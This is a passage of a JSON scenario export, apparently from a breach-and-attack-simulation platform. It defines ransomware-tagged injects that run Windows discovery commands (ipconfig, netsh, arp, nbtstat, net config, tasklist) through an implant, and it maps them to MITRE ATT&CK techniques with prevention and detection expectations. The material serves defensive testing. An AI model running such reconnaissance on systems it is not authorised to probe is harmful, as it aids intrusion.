        "en" : "System Network Configuration Discovery on Windows",
        "fr" : "System Network Configuration Discovery on Windows"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"System Network Configuration Discovery on Windows\",\"fr\":\"System Network Configuration Discovery on Windows\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"7cc5ec12-1e94-4d84-a8bc-0ac1caae8c6f\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "a6210342-a17e-4273-a99d-6137eac0820f",
        "payload_type" : "Command",
        "payload_name" : "System Network Configuration Discovery on Windows",
        "payload_description" : "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "2c07d522-40e4-4291-baa0-91c69caa4f44",
          "attack_pattern_name" : "System Network Configuration Discovery",
          "attack_pattern_description" : "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
          "attack_pattern_external_id" : "T1016",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "970ab6a1-0157-4f3f-9a73-ec4166754b23",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:44.639020Z",
        "payload_updated_at" : "2025-07-03T14:50:39.193518Z",
        "command_executor" : "cmd",
        "command_content" : "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:44.653040Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:44.653040Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "2c07d522-40e4-4291-baa0-91c69caa4f44",
        "attack_pattern_name" : "System Network Configuration Discovery",
        "attack_pattern_description" : "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
        "attack_pattern_external_id" : "T1016",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "f6247c01-a2cb-4832-bf0e-cd9e05b35223",
    "inject_title" : "Process Discovery - tasklist",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "d962715f-bac1-4788-8981-6a82034af1ee",
        "inject_children_id" : "f6247c01-a2cb-4832-bf0e-cd9e05b35223"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:34.159383Z",
      "dependency_updated_at" : "2025-07-04T15:49:34.159396Z"
    } ],
    "inject_depends_duration" : 240,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Process Discovery - tasklist",
          "fr" : "Process Discovery - tasklist"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "1935bbd1-bfbb-4e25-b504-2c52aebdede1",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "1935bbd1-bfbb-4e25-b504-2c52aebdede1",
      "injector_contract_labels" : {
        "en" : "Process Discovery - tasklist",
        "fr" : "Process Discovery - tasklist"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Process Discovery - tasklist\",\"fr\":\"Process Discovery - tasklist\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"1935bbd1-bfbb-4e25-b504-2c52aebdede1\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "9a48871c-e21d-422f-b13b-e50e6b585747",
        "payload_type" : "Command",
        "payload_name" : "Process Discovery - tasklist",
        "payload_description" : "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "63d77e78-e4a2-4c42-8e8f-7bc4e5f48fb9",
          "attack_pattern_name" : "Process Discovery",
          "attack_pattern_description" : "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
          "attack_pattern_external_id" : "T1057",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "c5806a4f-62b8-4900-980b-c7ec004e9908",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:46.046360Z",
        "payload_updated_at" : "2025-07-03T14:50:46.702988Z",
        "command_executor" : "cmd",
        "command_content" : "tasklist\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:46.059930Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:46.059930Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "63d77e78-e4a2-4c42-8e8f-7bc4e5f48fb9",
        "attack_pattern_name" : "Process Discovery",
        "attack_pattern_description" : "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
        "attack_pattern_external_id" : "T1057",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  } ],
  "scenario_tags" : [ {
    "tag_id" : "d524d1db-7ab6-4737-b45f-aab997c9f612",
    "tag_name" : "ransomware",
    "tag_color" : "#8fd671"
  } ],
  "scenario_documents" : [ ],
  "scenario_channels" : [ ],
  "scenario_articles" : [ ],
  "scenario_challenges" : [ ],
  "scenario_lessons_categories" : [ ],
  "scenario_lessons_questions" : [ ],
  "scenario_variables" : [ ]
}
